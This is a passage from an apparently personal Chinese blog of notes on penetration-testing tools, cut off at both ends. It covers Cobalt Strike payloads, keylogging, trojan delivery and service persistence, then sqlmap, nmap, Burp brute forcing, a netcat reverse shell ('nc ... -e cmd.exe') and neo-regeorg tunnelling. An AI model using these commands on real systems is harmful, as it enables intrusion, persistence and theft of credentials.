class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><br>    - target<br><br>    - weblog：web日志<br><br>  - attacks：<br><br>    - package：攻击方式<br>      - HTML application基于HTML攻击应用的载荷<br>      - MS office macro宏病毒<br>      - Payload Generator：生成payload<br>      - Windows Executable：生成exe后门对方运行即可上线<br>      - Windows Executable（s）：提供代理设置，内网攻击可能用到<br>    - Web Drive-by：<br>      - manage：肉鸡管理<br>      - clone site：克隆网站<br>      - Host file：指定文件夹到web里<br>      - Script web delivery：web攻击模块<br>      - signed applet attack：Java钓鱼<br>      - smark applet attack<br>      - system profile：客户端检测工具<br>    - spear Phish：钓鱼邮件<br><br>  - Reporting：生成报告栏<br><br>- 右击肉鸡<br><br>  - intetact:输入指令<br>    - 如果目标在域上面可以使用net computer查看计算机<br>    - net dclist查找域控<br>    - net domain_trusts域的信任情况<br>    - net logons<br>    - net share共享<br>    - <br>  - access:<br>    - make Token:创建一个虚拟用户<br>  - exploit:<br>    - Browser Pivot:监听浏览器以获取cookie<br>    - Desktop:监控桌面<br>    - File Browser:<br>      - ![image-20220218123725120](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-10.png)<br>    - port scan:扫描端口<br>    - process list:查看所有进程<br>    - screenshot:截屏幕<br>  - pivoting<br>    - socks server:使肉鸡创建代理<br>    - listeners:使肉鸡开启监听<br>  - session<br>    - sleep:命令反应时间<br>    - exit:关闭肉鸡<br>    - remove:移除肉鸡<br><br><br><br>### 用肉鸡来创建代理并连接到metasploit<br><br>![image-20220218121633689](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-11.png)<br><br><br><br><br><br>### 跳板攻击<br><br>![image-20220218121934998](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-12.png)<br><br>单击save就可以看见Listeners多了一个监听端口<br><br>![image-20220218122224254](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-13.png)<br><br>然后让其他内网直接连接这个ip:port即可 <br><br><br><br>### 监听浏览器输入<br><br>将进程添加到键盘记录<br><br>![image-20220218133049983](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-14.png)<br><br><br><br><br><br>打开全局的键盘监听<br><br>![image-20220218133152326](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-15.png)<br><br>然后就可以监听键盘记录了<br><br><br><br>### 提供下载木马地址并进行下载<br><br>首先生成一个木马<br><br>![image-20220218163434235](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-16.png)<br><br>设置监听的文件第二个图的file里选择木马，url里面的文件名称要和你的木马名称一致<br><br>![image-20220218163509654](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-17.png)<br><br>![image-20220218163554181](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-18.png)<br><br><br><br>launch后他给出下载文件的地址,复制即可下载运行即可上线<br><br>![image-20220218163757545](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-19.png)<br><br><br><br>### 维持化<br><br>首先生成一个木马<br><br>选择一个目录<br><br>upload [木马所在位置]这也就可以上传了<br><br>shell sc create &quot;服务名称&quot; -binpath=&quot;脚本全称(包含路径)&quot;<br><br>shell sc description &quot;服务名称&quot; &quot;服务的描述&quot;<br><br>shell sc config &quot;服务名称&quot; start=auto<br><br>shell net start &quot;服务名称&quot;<br><br><br><br>### 多层次的连接<br><br>方法一:<br><br>首先给添加一个tcp监听<br><br>![image-20220218171804604](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-20.png)<br><br>然后创建一个payload使用刚刚建立的tcp监听<br><br>![image-20220218171859961](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311932081.png)<br><br>然后上传到目标的内网服务器中并运行<br><br>然后使用肉鸡的命令行输入connect [目标的ip地址]<br><br>![image-20220218172009462](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-22.png)<br><br>方法二:<br><br>![image-20220218172823811](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-23.png)<br><br>首先使用肉鸡建立一个监听<br><br>生成payload 使用这个监听<br><br>然后让目标主机运行即可<br><br><br><br>特征过滤：https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/<br><br><br><br>## AWVS<br><br>AWVS是一款知名的自动化网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。它可以扫描任何可通过Web浏览器访问的和遵循HTTP/HTTPS规则的Web站点和Web应用程序。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。WVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。<br><br><br><br>&gt;pull 拉取下载镜像<br>&gt;docker pull secfa/docker-awvs<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;或者<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;docker pull secfa/awvs<br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span><br>&gt;将Docker的3443端口映射到物理机的 13443端口<br>&gt;docker run -it -d -p 13443:3443 secfa/docker-awvs<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;容器的相关信息<br>&gt;awvs13 username: admin@admin.com<br>&gt;awvs13 password: Admin123<br>&gt;AWVS版本：13.0.200217097<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;浏览器访问：https://127.0.0.1:13443/ 即可<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;注意了是HTTPS而不是HTTP<br><br>https://www.bilibili.com/video/BV1fz4y1U7tt?from=search&amp;seid=3146379149281441812&amp;spm_id_from=333.337.0.0<br><br>这上面最后一部分讲到了代码如何使用<br><br>## nmap<br><br>nmap：一款端口扫描工具<br><br>使用方法以及参数如下<br><br>==在这里$ 代表ip或者url==<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">nmap $</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">v</span>:显示详细信息</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">p</span>:指定端口</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">  - -p <span class="hljs-number">80</span>,<span class="hljs-number">8080</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">O</span>:扫描目标是什么操作系统,使用的什么协议</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -iL 文件:扫描指定文件的ip</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">V</span>:版本检测 用于扫描目标主机服务版本号. 探测打开的端口以确定服务/版本信息</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sA</span>:综合模式扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sS</span>:安全模式扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sL</span>:list扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sT</span>:使用tcp扫描模式</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sF</span>:快速扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sR</span>:<span class="hljs-variable constant_">RPC</span>扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sn</span>:测试存活主机</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">U</span>:测试那些udp开放</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">X</span>:表示以xml的格式输出结果到以文件</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">P</span>:ping探测</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-title class_">Pn</span>:跳过主机存活扫描过程</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">P0</span>:ip检测协议是否开启</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">T</span>:设定模板(越高越快)</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">常用</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">nmap -sS $</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">nmap -sA -T <span class="hljs-number">4</span> $</span><br><br><br><br>## SQLmap<br><br>nginx /etc/nginx/nginx.conf<br><br><br><br>一款sql注入测试工具<br><br><br><br>sqlmap -r 文件名<br><br>sqlmap -u url或者域名<br><br>哪个位置需要进行注入就在哪个位置加==\*==,如下<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">sqlmap -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost/?id=111\*&amp;kkk=aaa</span></span><br><br>这样就可以对id进行注入了(文件中也一样)<br><br>下面是常用命令<br><br>&gt;- --dbs:获取所有的数库<br>&gt;- --current-db:获取当前的数据库<br>&gt;- --threads 10:开启10个线程<br>&gt;- --data id=111&amp;password=222:使用post提交,并且表单为id和password<br>&gt;- --tables -D &quot;库&quot;:获取指定数据库的所有表<br>&gt;- --columns -T &quot;表名称&quot; -D &quot;库名&quot;:获取指定库名的表中所有字段<br>&gt;- --dump -T &quot;表名称&quot; -D &quot;库名&quot; -C &quot;字段&quot;:获取指定按照指定的库名表名字段来获取数据库的数据<br>&gt;- --cookie:使用cookie<br>&gt;- --file-read&quot;读取的文件夹位置&quot;:读取某个文件<br>&gt;- --file-write &quot;绝对路径&quot;:写入文件到某个绝对路径中<br>&gt;- --batch:自动yes<br>&gt;- --risk 3:执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全<br>&gt;- --referer &quot;&quot;:使用referer欺骗<br>&gt;- --user-agent &quot;&quot;:自定义user-agent<br>&gt;- --proxy &quot;目标地址&quot;:使用代理注入<br>&gt;-  -v  详细的等级(0-6)<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">0</span>：只显示<span class="hljs-title class_">Python</span>的回溯，错误和关键消息。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">1</span>：显示信息和警告消息。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">2</span>：显示调试消息。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">3</span>：有效载荷注入。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">4</span>：显示<span class="hljs-variable constant_">HTTP</span>请求。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">5</span>：显示<span class="hljs-variable constant_">HTTP</span>响应头。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">6</span>：显示<span class="hljs-variable constant_">HTTP</span>响应页面的内容</span><br>&gt;- --os-shell(需要绝对路径和语言):获取shell<br><br><br><br>## Burp<br><br><br><br>是一个数据包捕获软件<br><br>首先我们可以设置代理<br><br>![image-20220122160622437](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-1.png)<br><br>然后去浏览器设置代理以火狐为例子<br><br>去设置里面的高级---网络---代理<br><br>![image-20220122161034011](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-2.png)<br><br>然后安装协议首先访问http://burp<br><br>然后下载证书,然后进入设置,高级---证书---证书机构---导入   这样导入证书<br><br>![image-20220122161254985](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-3.png)<br><br><br><br>#### 使用本地的DNS<br><br>![image-20220122161507557](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-4.png)<br><br><br><br>选择这个打开dns服务器,然后就可以使用并看到结果了<br><br>![image-20220122161604192](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-5.png)<br><br><br><br>当我们抓取到数据后就可以进行参数设置,当我们进行post提交的时候有时需要进行编码的调整如:==%00需要被编码否则传输过程中可能会丢失,而且%00进行base64时会被丢失==<br><br><br><br>![image-20220122162024999](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-6.png)<br><br>Send to Intruder和Send to Repeater的时候不能选择东西否则只会进行选择部分的测试<br><br><br><br>#### 首先介绍一下Send to Intruder    暴力破解<br><br>pikaqiu靶场<br><br>暴力破解第一题<br><br>首先单击请求进行请求<br><br>![image-20220119151356569](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-7.png)<br><br>然后抓到包后ctrl+i<br><br>![image-20220119151545986](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-8.png)<br><br><br><br>然后进入如下模块并对破解点进行添加<br><br>![image-20220119151700990](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-9.png)<br><br><br><br>![image-20220119154920801](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-10.png)<br><br>设置一个type然后进入payloads<br><br>![image-20220119155535580](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-11.png)<br><br>设置线程数量<br><br>![image-20220119155617982](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-12.png)<br><br>设置正则获取页面数据<br><br>![image-20220119155652450](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-13.png)<br><br><br><br>单机add设置正则<br><br>![image-20220119155849551](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-14.png)<br><br><br><br>![image-20220119160023712](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-15.png)<br><br><br><br>设置每次攻击前重新获取token就要进行重定向<br><br>![image-20220119160133327](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-16.png)<br><br><br><br>## nc<br><br>一个进行远程命令控制的<br><br><br><br>黑客电脑的nc运行如下命令<br><br>nc -lvp [端口号]<br><br><br><br>靶机运行如下命令<br><br>nc -nv [ip] [端口] -e cmd.exe<br><br><br><br><br><br>&gt;- -l:将nc监听模式运行<br>&gt;- -k:接受一个请求不会结束而是继续监听<br><br><br><br>## neo-regeorg<br><br>生成一个有密码的脚本<br><br>python neoreg.py generate -k 密码<br><br>然后生成几个脚本，将脚本放到目标网站并且能访问到<br><br>python neoreg.py -k 密码 -u 网站的脚本位置<br><br>然后他会返回一个socket5的连接方法,将他设置为代理即可访问<br><br>## WireShark<br><br>![image-20220214133549383](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/wireshark-1.png)<br><br> （1）Frame:  物理层的数据帧概况<br><br> （2）Ethernet II: 数据链路层以太网帧头部信息<br><br> （3）Internet Protocol Version 4: 互联网层IP包头部信息<br><br> （4）Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP<br><br> （5）Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议<br><br><br><br>过滤规则<br><br>ip==127.0.0.1<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">ip.<span class="hljs-property">dst</span>==<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>目的ip查询</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">ip.<span class="hljs-property">src</span>==<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>源ip查询</span><br><br><br><br>协议过滤<br><br>直接写协议即可如tcp,icmp,udp,http等<br><br>&gt;对协议内的内容进行过滤如:<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;http.request.method==&quot;POST&quot;<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;tcp.port=443<br><br><br><br>连接符<br><br>and/or/not<br><br><br><br>tcp三次握手<br><br>第一次发送数据包SYN=1,ACK=0<br><br>第二次接收数据包SYN=1,ACK=1<br><br>第三次发送数据包SYN=0,ACK=1<br><br><br><br>## Nessus<br><br>http://www.luckyzmj.cn/posts/477c90d0.html<br><br><br><br><br><br>## dirsearch<br><br>官网地址<br><br>https://github.com/maurosoria/dirsearch<br><br>直接使用python3 安装即可<br><br>&gt;pypi: pip3 install dirsearch<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;dirsearch -u url -e 框架类型(php,asp)<br><br><br><br>使用语法<br><br>&gt;Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;Options:<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> --version             show program<span class="hljs-string">&#x27;s version number and exit</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string"> -h, --help            show this help message and exit</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string"> Mandatory:</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -u URL, --url=URL   Target URL</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -l FILE, --url-list=FILE</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Target URL list file</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --stdin             Target URL list from STDIN</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --cidr=CIDR         Target CIDR</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --raw=FILE          Load raw HTTP request from file (use `--scheme` flag</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       to set the scheme)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -e EXTENSIONS, --extensions=EXTENSIONS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Extension list separated by commas (Example: php,asp)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Exclude extension list separated by commas (Example:</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       asp,jsp)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -f, --force-extensions</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Add extensions to every wordlist entry. By default</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       dirsearch only replaces the %EXT% keyword with</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       extensions</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string"> Dictionary Settings:</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -w WORDLIST, --wordlists=WORDLIST</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Customize wordlists (separated by commas)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --prefixes=PREFIXES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Add custom prefixes to all wordlist entries (separated</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       by commas)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --suffixes=SUFFIXES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Add custom suffixes to all wordlist entries, ignore</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       directories (separated by commas)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --only-selected     Remove paths have different extensions from selected</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       ones via `-e` (keep entries don&#x27;</span>t have extensions)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --remove-extensions</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Remove</span> extensions <span class="hljs-keyword">in</span> all paths (<span class="hljs-title class_">Example</span>: admin.<span class="hljs-property">php</span> -&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       admin)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -U, --uppercase     <span class="hljs-title class_">Uppercase</span> wordlist</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -L, --lowercase     <span class="hljs-title class_">Lowercase</span> wordlist</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -C, --capital       <span class="hljs-title class_">Capital</span> wordlist</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> <span class="hljs-title class_">General</span> <span class="hljs-title class_">Settings</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -t <span class="hljs-variable constant_">THREADS</span>, --threads=<span class="hljs-variable constant_">THREADS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Number</span> <span class="hljs-keyword">of</span> threads</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -r, --recursive     <span class="hljs-title class_">Brute</span>-force recursively</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --deep-recursive    <span class="hljs-title class_">Perform</span> recursive scan on every directory depth</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       (<span class="hljs-title class_">Example</span>: api/users -&gt; api/)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --force-recursive   <span class="hljs-title class_">Do</span> recursive brute-force <span class="hljs-keyword">for</span> every found path, not</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       only paths end <span class="hljs-keyword">with</span> slash</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --recursion-depth=<span class="hljs-variable constant_">DEPTH</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Maximum</span> recursion depth</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --recursion-status=<span class="hljs-variable constant_">CODES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Valid</span> status codes to perform recursive scan, support</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       ranges (separated by commas)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --subdirs=<span class="hljs-variable constant_">SUBDIRS</span>   <span class="hljs-title class_">Scan</span> sub-directories <span class="hljs-keyword">of</span> the given <span class="hljs-variable constant_">URL</span>[s] (separated by</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       commas)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-subdirs=<span class="hljs-variable constant_">SUBDIRS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> the following subdirectories during recursive</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       scan (separated by commas)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -i <span class="hljs-variable constant_">CODES</span>, --include-status=<span class="hljs-variable constant_">CODES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Include</span> status codes, separated by commas, support</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       ranges (<span class="hljs-title class_">Example</span>: <span class="hljs-number">200</span>,<span class="hljs-number">300</span>-<span class="hljs-number">399</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -x <span class="hljs-variable constant_">CODES</span>, --exclude-status=<span class="hljs-variable constant_">CODES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> status codes, separated by commas, support</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       ranges (<span class="hljs-title class_">Example</span>: <span class="hljs-number">301</span>,<span class="hljs-number">500</span>-<span class="hljs-number">599</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-sizes=<span class="hljs-variable constant_">SIZES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by sizes, separated by commas</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       (<span class="hljs-title class_">Example</span>: 123B,4KB)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-texts=<span class="hljs-variable constant_">TEXTS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by texts, separated by commas</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       (<span class="hljs-title class_">Example</span>: <span class="hljs-string">&#x27;Not found&#x27;</span>, <span class="hljs-string">&#x27;Error&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-regexps=<span class="hljs-variable constant_">REGEXPS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by regexps, separated by commas</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       (<span class="hljs-title class_">Example</span>: <span class="hljs-string">&#x27;Not foun[a-z]&#123;1&#125;&#x27;</span>, <span class="hljs-string">&#x27;^Error$&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-redirects=<span class="hljs-variable 